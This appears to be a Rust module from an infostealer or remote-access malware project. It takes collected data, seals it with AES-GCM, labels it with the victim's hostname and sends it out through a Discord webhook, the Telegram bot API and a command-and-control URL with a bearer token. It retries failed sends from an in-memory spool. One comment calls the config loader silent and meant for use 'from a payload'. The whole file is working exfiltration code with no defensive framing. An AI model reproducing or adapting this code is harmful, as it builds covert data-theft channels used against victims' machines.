//! Multi-channel exfil. Every payload AES-GCM sealed under exfil key.
//!
//! Config stored in a OnceLock, safe from any thread. Failed sends
//! are spooled in-memory and retried on `drain_spool()`.
//!
//! Field aliases: accepts both `discord` and `discord_webhook`.

use crate::crypto::seal;
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};
use std::time::{SystemTime, UNIX_EPOCH};

#[derive(Clone, Default, Serialize, Deserialize)]
pub struct ExfilConfig {
    #[serde(default, alias = "discord_webhook")]
    pub discord: String,
    #[serde(default)]
    pub telegram_token: String,
    #[serde(default)]
    pub telegram_chat: String,
    #[serde(default)]
    pub c2_url: String,
    #[serde(default)]
    pub c2_auth: String,
}

impl ExfilConfig {
    /// True if at least one channel is configured.
    pub fn has_any_channel(&self) -> bool {
        !self.discord.is_empty()
            || (!self.telegram_token.is_empty() && !self.telegram_chat.is_empty())
            || !self.c2_url.is_empty()
    }
}

static CONFIG: OnceLock<ExfilConfig> = OnceLock::new();

pub fn init(cfg: ExfilConfig) {
    let _ = CONFIG.set(cfg);
}

pub fn init_from_path(path: &Path) -> Result<(), String> {
    let raw = std::fs::read_to_string(path)
        .map_err(|e| format!("read {}: {}", path.display(), e))?;
    let cfg: ExfilConfig = serde_json::from_str(&raw)
        .map_err(|e| format!("parse {}: {}", path.display(), e))?;
    init(cfg);
    Ok(())
}

pub fn init_from_candidates(paths: &[&Path]) -> Result<(), String> {
    let mut last_err = String::from("no candidate paths");
    for p in paths {
        match init_from_path(p) {
            Ok(()) => return Ok(()),
            Err(e) => last_err = e,
        }
    }
    Err(last_err)
}

/// Read secrets from `SVC_SECRETS_PATH`, then default locations.
/// Silent — returns () and logs nothing. Use this from a payload
/// where missing secrets shouldn't be loud.
pub fn init_from_env() {
    // already initialized?
    if CONFIG.get().is_some() {
        return;
    }

    let mut candidates: Vec<PathBuf> = Vec::new();

    if let Ok(p) = std::env::var("SVC_SECRETS_PATH") {
        if !p.is_empty() {
            candidates.push(PathBuf::from(p));
        }
    }

    #[cfg(windows)]
    {
        if let Ok(appdata) = std::env::var("APPDATA") {
            if !appdata.is_empty() {
                candidates.push(PathBuf::from(appdata).join("svc").join("secrets.json"));
            }
        }
    }

    if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
        if !xdg.is_empty() {
            candidates.push(PathBuf::from(xdg).join("svc").join("secrets.json"));
        }
    }

    if let Ok(home) = std::env::var("HOME") {
        candidates.push(
            PathBuf::from(home)
                .join(".config")
                .join("svc")
                .join("secrets.json"),
        );
    }

    let refs: Vec<&Path> = candidates.iter().map(|p| p.as_path()).collect();
    let _ = init_from_candidates(&refs);
}

fn cfg() -> ExfilConfig {
    CONFIG.get().cloned().unwrap_or_default()
}

// ─── spool ────────────────────────────────────────────────────────

#[derive(Clone)]
struct SpoolItem {
    tag: String,
    sealed: String,
    raw_len: usize,
}

static SPOOL: OnceLock<Mutex<Vec<SpoolItem>>> = OnceLock::new();
const SPOOL_MAX: usize = 256;

fn spool() -> &'static Mutex<Vec<SpoolItem>> {
    SPOOL.get_or_init(|| Mutex::new(Vec::new()))
}

fn spool_push(tag: &str, sealed: &str, raw_len: usize) {
    if let Ok(mut q) = spool().lock() {
        if q.len() < SPOOL_MAX {
            q.push(SpoolItem {
                tag: tag.to_string(),
                sealed: sealed.to_string(),
                raw_len,
            });
        }
    }
}

/// Retry everything currently spooled. Successful items are removed;
/// failed items stay for the next call. Returns count still pending.
pub fn drain_spool() -> usize {
    let items: Vec<SpoolItem> = match spool().lock() {
        Ok(mut q) => std::mem::take(&mut *q),
        Err(_) => return 0,
    };
    if items.is_empty() {
        return 0;
    }

    let mut still_pending: Vec<SpoolItem> = Vec::new();
    for it in items {
        if !send_through_channels(&it.tag, it.raw_len, &it.sealed) {
            still_pending.push(it);
        }
    }

    let pending = still_pending.len();
    if pending > 0 {
        if let Ok(mut q) = spool().lock() {
            for it in still_pending {
                if q.len() >= SPOOL_MAX {
                    break;
                }
                q.push(it);
            }
        }
    }
    pending
}

// ─── envelope / dispatch ─────────────────────────────────────────

#[derive(Serialize)]
struct Envelope<'a, T: Serialize> {
    tag: &'a str,
    ts: f64,
    data: T,
}

pub fn exfil_event<T: Serialize>(tag: &str, data: T) {
    let env = Envelope {
        tag,
        ts: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs_f64())
            .unwrap_or(0.0),
        data,
    };
    let raw = serde_json::to_vec(&env).unwrap_or_default();
    let sealed = seal(&raw);

    if !send_through_channels(tag, raw.len(), &sealed) {
        // queue for next drain
        spool_push(tag, &sealed, raw.len());
    }
}

/// Attempt delivery to every configured channel. Returns true if at
/// least one channel accepted the payload.
fn send_through_channels(tag: &str, raw_len: usize, sealed: &str) -> bool {
    let c = cfg();
    if !c.has_any_channel() {
        return false;
    }
    let host = crate::sysinfo::SysInfo::collect().hostname;
    let mut delivered = false;

    if sealed.len() < 1800 {
        let msg = format!("[{}] {}B {}\n```{}```", tag, raw_len, host, sealed);
        if !c.discord.is_empty() {
            if let Ok(r) = reqwest::blocking::Client::new()
                .post(&c.discord)
                .json(&serde_json::json!({ "content": msg }))
                .timeout(std::time::Duration::from_secs(8))
                .send()
            {
                if r.status().is_success() {
                    delivered = true;
                }
            }
        }
    } else {
        if !c.discord.is_empty() {
            let form = reqwest::blocking::multipart::Form::new().part(
                "file",
                reqwest::blocking::multipart::Part::bytes(sealed.as_bytes().to_vec())
                    .file_name(format!("{}_{}.bin", tag, fast_ts())),
            );
            if let Ok(r) = reqwest::blocking::Client::new()
                .post(&c.discord)
                .multipart(form)
                .timeout(std::time::Duration::from_secs(30))
                .send()
            {
                if r.status().is_success() {
                    delivered = true;
                }
            }
        }
        if !c.telegram_token.is_empty() && !c.telegram_chat.is_empty() {
            let url = format!(
                "https://api.telegram.org/bot{}/sendDocument",
                c.telegram_token
            );
            let form = reqwest::blocking::multipart::Form::new()
                .text("chat_id", c.telegram_chat.clone())
                .part(
                    "document",
                    reqwest::blocking::multipart::Part::bytes(sealed.as_bytes().to_vec())
                        .file_name(format!("{}.bin", tag)),
                );
            if let Ok(r) = reqwest::blocking::Client::new()
                .post(&url)
                .multipart(form)
                .timeout(std::time::Duration::from_secs(60))
                .send()
            {
                if r.status().is_success() {
                    delivered = true;
                }
            }
        }
    }

    if !c.c2_url.is_empty() && c.c2_url.starts_with("http") {
        if let Ok(r) = reqwest::blocking::Client::new()
            .post(&c.c2_url)
            .header("Authorization", format!("Bearer {}", c.c2_auth))
            .body(sealed.to_string())
            .timeout(std::time::Duration::from_secs(30))
            .send()
        {
            if r.status().is_success() {
                delivered = true;
            }
        }
    }

    delivered
}

fn fast_ts() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
